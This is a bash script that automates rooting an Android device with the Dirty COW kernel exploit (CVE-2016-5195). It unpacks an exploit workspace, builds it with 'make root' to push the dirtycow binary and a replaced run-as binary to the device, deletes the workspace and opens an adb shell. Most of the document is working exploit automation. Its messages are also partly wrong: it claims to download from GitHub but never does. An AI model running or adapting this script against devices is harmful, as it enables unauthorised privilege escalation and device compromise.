#!/bin/bash

# zip dirtyc0w_workspace.zip CVE-2016-5195-master
#
# [armeabi-v7a] Install        : dirtycow => libs/armeabi-v7a/dirtycow
# [armeabi-v7a] Install        : run-as => libs/armeabi-v7a/run-as

# adb shell pm list packages -f
# adb shell pm install /sdcard/package.apk
# adb shell run-as com.android.systemui sh
#
# Give the usual warning.
clear;
echo "[INFO] Automated Android root script started.\n\n[WARN] Exploit requires sdk module \"NDK\".\nFor more information, visit the installation guide @ https://goo.gl/E2nmLF\n[INFO] Press Ctrl+C to stop the script if you need to install the NDK module. Waiting 10 seconds...";
sleep 2;
clear;

# Download and extract exploit files.
echo "[INFO] Downloading exploit files from GitHub...";
workspacezipbackup="dirtyc0w_workspace_backup.zip";
workspacezip="dirtyc0w_workspace.zip";
workspace="dirtyc0w_workspace";
    echo "[INFO] Extracting exploit files...";
    unzip -a $workspacezip -d $workspace > /dev/null;
    cp $workspacezip $workspacezipbackup;
if [ -d $workspace ];
then
    cd $workspace;
    directory=$PWD; # thx @tomdeboer!
    cd CVE-2016-5195-master;
else
    echo "[ERR] Failed to extract exploit files.";
    exit 1;
fi;

# Compile and send exploit.
echo "[INFO] Exploiting dirtyc0w vulnerability...";
sleep 1; # Let them read the message before chaos
make root;
clear;

# Hooray!
echo -n "[INFO] Complete. Installed package \"run-as\" on device.\n[INFO] Cleaning up workspace...";
rm -rf $directory; # Clean up workspace
echo "Done";
echo "[INFO] Starting shell in 3 seconds...";
sleep 3; # Look, it worked!
adb shell;
clear;
exit 0;
